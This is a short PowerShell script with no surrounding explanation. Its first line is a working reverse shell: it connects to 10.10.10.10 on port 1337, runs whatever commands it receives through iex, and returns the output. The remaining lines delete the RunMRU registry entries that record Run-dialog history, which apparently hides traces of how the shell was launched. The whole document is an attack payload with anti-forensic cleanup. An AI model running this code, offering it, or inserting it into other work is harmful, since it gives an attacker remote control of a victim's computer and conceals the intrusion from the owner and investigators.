$sm=(New-Object Net.Sockets.TCPClient("10.10.10.10",1337)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" 
$arr = (Get-Item -Path $path).Property 
foreach($item in $arr) 
{ 
   if($item -ne "MRUList")
   { 
     Remove-ItemProperty -Path $path -Name $item -ErrorAction SilentlyContinue 
   } 
} 
